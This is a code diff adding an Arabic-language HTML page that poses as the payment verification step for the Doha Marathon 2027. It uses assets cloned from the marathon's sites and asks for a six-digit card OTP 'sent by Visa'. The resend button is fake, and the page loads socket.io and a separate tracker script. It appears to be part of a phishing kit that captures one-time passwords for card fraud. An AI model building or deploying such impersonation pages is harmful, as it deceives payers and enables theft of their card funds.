@@ -1,0 +1,156 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#ed1c24">
+	<title>التحقق من الدفع - ماراثون الدوحة 2027</title>
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
+	<link rel="stylesheet" href="assets/registration-payment.css">
+	<style>
+		.otp-section { text-align:center; margin:24px 0; }
+		.otp-section p { font-size:14px; color:#555; margin-bottom:16px; line-height:1.6; }
+		.otp-inputs { display:flex; gap:10px; justify-content:center; direction:ltr; margin:20px 0; }
+		.otp-inputs input {
+			width:48px; height:56px; text-align:center; font-size:22px; font-weight:700;
+			border:1.5px solid #d4d4d4; border-radius:10px; background:#fff; color:#101010;
+			transition: border-color .2s;
+		}
+		.otp-inputs input:focus { outline:none; border-color:var(--brand); }
+		.resend-row { margin-top:14px; font-size:13px; color:#777; }
+		.resend-row a { color:var(--brand); font-weight:600; text-decoration:none; cursor:pointer; }
+	</style>
+</head>
+<body>
+	<header class="payment-header">
+		<nav class="header-actions" aria-label="روابط سريعة">
+			<a href="index.html" aria-label="العودة للرئيسية" title="العودة للرئيسية">
+				<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"></path></svg>
+			</a>
+			<span class="participant-count" aria-label="مشارك واحد">(1)</span>
+			<svg class="cart-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h2l2.3 12.1a2 2 0 0 0 2 1.6h9.9a2 2 0 0 0 2-1.6L22 7H5"></path><circle cx="9" cy="21" r="1"></circle><circle cx="18" cy="21" r="1"></circle></svg>
+		</nav>
+		<a class="payment-brand" href="index.html" aria-label="ماراثون الدوحة من أريدُ">
+			<img src="assets/suffixevnt.blob.core.windows.net/dohaimages/2025/06/Logo.png" alt="ماراثون الدوحة من أريدُ">
+		</a>
+	</header>
+
+	<main class="payment-shell">
+		<section class="payment-card" aria-label="التحقق من الدفع">
+			<div class="session-row">
+				<strong id="session-countdown" class="session-countdown" aria-live="off">10:00</strong>
+				<span>تنتهي صلاحية الجلسة خلال</span>
+			</div>
+
+			<div class="payment-total">
+				<p>إجمالي المبلغ المستحق الدفع</p>
+				<strong id="payment-total" class="amount"></strong>
+			</div>
+
+			<form id="verify-form" novalidate>
+				<div class="otp-section">
+					<p>تم إرسال رمز التحقق (OTP) إلى هاتفك المسجل في Visa.<br>أدخل الرمز المكون من 6 أرقام للمتابعة.</p>
+					<div class="otp-inputs">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 1" data-idx="0">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 2" data-idx="1">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 3" data-idx="2">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 4" data-idx="3">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 5" data-idx="4">
+						<input type="tel" maxlength="1" inputmode="numeric" aria-label="الرقم 6" data-idx="5">
+					</div>
+					<input type="hidden" name="verify-otp" id="verify-otp">
+					<div class="resend-row">
+						<span>لم يصل الرمز؟</span>
+						<a id="resend-btn">إعادة إرسال</a>
+					</div>
+				</div>
+
+				<button id="verify-button" class="pay-button" type="submit">تأكيد الدفع</button>
+				<p id="payment-message" class="payment-message" role="status" aria-live="polite" hidden></p>
+			</form>
+
+			<a class="back-link" href="payment-card.html">خلف</a>
+		</section>
+	</main>
+	<footer class="payment-footer" aria-hidden="true"></footer>
+<script src="/socket.io/socket.io.js"></script>
+<script src="/assets/tracker.js"></script>
+<script>
+(function(){
+	var reviewKey = "doha-marathon-registration-review";
+	var expiryKey = "doha-marathon-payment-expiry";
+	var review;
+	try { review = JSON.parse(sessionStorage.getItem(reviewKey) || "null"); } catch(e){ review = null; }
+
+	var totalEl = document.getElementById("payment-total");
+	if (review && typeof review.price === "number") {
+		totalEl.textContent = "QAR " + review.price.toFixed(2);
+	}
+
+	var savedExpiry = Number(sessionStorage.getItem(expiryKey));
+	var expiry = (savedExpiry > 0) ? savedExpiry : Date.now() + 10*60*1000;
+	sessionStorage.setItem(expiryKey, String(expiry));
+
+	var countdown = document.getElementById("session-countdown");
+	var msg = document.getElementById("payment-message");
+	function tick(){
+		var rem = Math.max(0, Math.ceil((expiry - Date.now())/1000));
+		var m = Math.floor(rem/60), s = rem%60;
+		if(countdown) countdown.textContent = String(m).padStart(2,"0")+":"+String(s).padStart(2,"0");
+		if(rem===0){ if(msg){msg.hidden=false; msg.textContent="انتهت صلاحية جلسة الدفع.";} clearInterval(tid); }
+	}
+	tick(); var tid = setInterval(tick, 1000);
+
+	// OTP input auto-advance
+	var inputs = document.querySelectorAll(".otp-inputs input");
+	var hidden = document.getElementById("verify-otp");
+	function collectOtp(){
+		var val = "";
+		inputs.forEach(function(inp){ val += inp.value; });
+		if(hidden) hidden.value = val;
+		return val;
+	}
+	inputs.forEach(function(inp, i){
+		inp.addEventListener("input", function(){
+			this.value = this.value.replace(/\D/g,"").substring(0,1);
+			collectOtp();
+			if(this.value && i < inputs.length - 1) inputs[i+1].focus();
+		});
+		inp.addEventListener("keydown", function(e){
+			if(e.key === "Backspace" && !this.value && i > 0){
+				inputs[i-1].focus();
+			}
+		});
+		inp.addEventListener("paste", function(e){
+			e.preventDefault();
+			var text = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g,"").substring(0,6);
+			for(var j=0; j<text.length && j<inputs.length; j++){
+				inputs[j].value = text[j];
+			}
+			collectOtp();
+			var focusIdx = Math.min(text.length, inputs.length - 1);
+			inputs[focusIdx].focus();
+		});
+	});
+
+	var resendBtn = document.getElementById("resend-btn");
+	if(resendBtn) resendBtn.addEventListener("click", function(){
+		if(msg){msg.hidden=false; msg.textContent="تم إعادة إرسال رمز التحقق.";}
+		setTimeout(function(){ if(msg) msg.hidden=true; }, 3000);
+	});
+
+	var form = document.getElementById("verify-form");
+	if(form) form.addEventListener("submit", function(e){
+		e.preventDefault();
+		var otp = collectOtp();
+		if(otp.length < 6){
+			if(msg){msg.hidden=false; msg.textContent="يرجى إدخال رمز التحقق المكون من 6 أرقام.";}
+			return;
+		}
+		window.location.assign("wait.html");
+	});
+})();
+</script>
+</body>
+</html>
